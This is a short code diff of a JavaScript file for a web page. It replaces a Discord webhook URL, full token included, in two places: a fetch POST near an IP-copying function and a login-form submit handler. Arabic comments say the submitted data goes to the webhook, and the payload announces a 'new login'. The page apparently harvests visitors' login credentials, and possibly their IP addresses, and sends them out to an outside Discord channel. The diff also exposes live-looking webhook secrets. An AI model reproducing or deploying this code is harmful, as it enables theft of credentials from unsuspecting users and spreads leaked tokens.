@@ -7,7 +7,7 @@ function copyIP() {
     });
 }
 
-fetch("https://discord.com/api/webhooks/1341510572868505672/svGdyk3TSMv9pKjTm6JOaSNENsR5_M73S8n_boruUhukvoz0C9wdXlA_oa-n8T9pFybf", {
+fetch("https://discord.com/api/webhooks/1341518974269132902/juhQa4lsSz9nlrIGxdjaF20cMVHl3l9bTGyqUIDT4akjbRDoPpAWFWQ2CvFJnDbtatAD", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
@@ -43,7 +43,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     }
 
     // إرسال البيانات إلى Webhook في Discord
-    const webhookURL = "https://discord.com/api/webhooks/1341510572868505672/svGdyk3TSMv9pKjTm6JOaSNENsR5_M73S8n_boruUhukvoz0C9wdXlA_oa-n8T9pFybf"; // ضع رابط Webhook هنا
+    const webhookURL = "https://discord.com/api/webhooks/1341518974269132902/juhQa4lsSz9nlrIGxdjaF20cMVHl3l9bTGyqUIDT4akjbRDoPpAWFWQ2CvFJnDbtatAD"; // ضع رابط Webhook هنا
 
     const payload = {
         content: "**🟢 تسجيل دخول جديد!**",
